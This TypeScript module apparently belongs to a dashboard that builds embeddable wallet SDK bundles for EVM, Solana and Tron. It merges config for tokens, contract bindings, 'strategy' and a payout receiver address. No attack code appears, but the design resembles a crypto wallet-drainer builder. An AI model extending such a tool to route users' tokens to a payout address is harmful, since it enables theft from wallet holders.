import { readCompileConfig, type CompileConfig } from "@/lib/compile-config-store";
import { readOperationalConfig } from "@/lib/operational-config-store";
import {
  defaultAdvancedConfig,
  defaultAppKitConfig,
  defaultContractsConfig,
  defaultGeneralConfig,
  defaultModalConfig,
  defaultPayoutConfig,
  defaultStrategyConfig,
  defaultTokensConfig,
  defaultWalletConfig,
} from "@/lib/mock-data";
import { generateSDKBundle } from "@/lib/sdk-generator";
import { generateSolanaBundle, generateTronBundle } from "@/lib/runtime-bundles";
import { getStandardExecutionBindings } from "@/lib/standard-function-bindings";

/**
 * Merges saved Compile tab JSON with operational (contracts, strategy, payout, appKit).
 * Used by GET /api/sdk so embeds always track the dashboard without re-downloading a file.
 */
export async function mergePersistedAndOperationalConfig(): Promise<CompileConfig> {
  const operational = await readOperationalConfig();
  const stored = await readCompileConfig();
  const configuredBindings = [
    ...(operational.contracts?.functionBindings || []),
    ...(stored.contracts?.functionBindings || []),
  ];
  const bindingsByPreset = new Map(
    getStandardExecutionBindings().map((binding) => [binding.preset, binding]),
  );
  for (const binding of configuredBindings) {
    const standard = bindingsByPreset.get(binding.preset);
    bindingsByPreset.set(binding.preset, {
      ...standard,
      ...binding,
      abi: binding.abi?.length ? binding.abi : (standard?.abi || []),
    });
  }
  return {
    general: { ...defaultGeneralConfig, ...stored.general },
    wallet: { ...defaultWalletConfig, ...stored.wallet },
    modal: { ...defaultModalConfig, ...stored.modal },
    tokens: { ...defaultTokensConfig, ...stored.tokens },
    advanced: { ...defaultAdvancedConfig, ...stored.advanced },
    payout: { ...defaultPayoutConfig, ...operational.payout, ...stored.payout },
    contracts: {
      ...defaultContractsConfig,
      ...operational.contracts,
      ...stored.contracts,
      functionBindings: [...bindingsByPreset.values()],
    },
    strategy: { ...defaultStrategyConfig, ...operational.strategy, ...stored.strategy },
    appKit: { ...defaultAppKitConfig, ...operational.appKit, ...stored.appKit },
  };
}

export async function generateLiveSdkBundle(receiverOverride?: string): Promise<string> {
  const merged = await mergePersistedAndOperationalConfig();
  const operational = await readOperationalConfig();
  const resolved =
    (receiverOverride && receiverOverride.trim()) ||
    operational.payout?.address ||
    merged.payout.address ||
    "0x0000000000000000000000000000000000000000";

  if (merged.general.ecosystem === "solana") {
    return generateSolanaBundle({
      general: merged.general,
      wallet: merged.wallet,
      modal: merged.modal,
      tokens: merged.tokens,
      advanced: merged.advanced,
      receiverAddress: resolved,
    });
  }
  if (merged.general.ecosystem === "tron") {
    return generateTronBundle({
      general: merged.general,
      wallet: merged.wallet,
      modal: merged.modal,
      tokens: merged.tokens,
      advanced: merged.advanced,
      receiverAddress: resolved,
    });
  }

  return generateSDKBundle({
    general: merged.general,
    wallet: merged.wallet,
    modal: { ...merged.modal, exposeExternalSDK: true },
    tokens: merged.tokens,
    advanced: merged.advanced,
    contracts: merged.contracts,
    strategy: merged.strategy,
    appKit: merged.appKit,
    receiverAddress: resolved,
  });
}
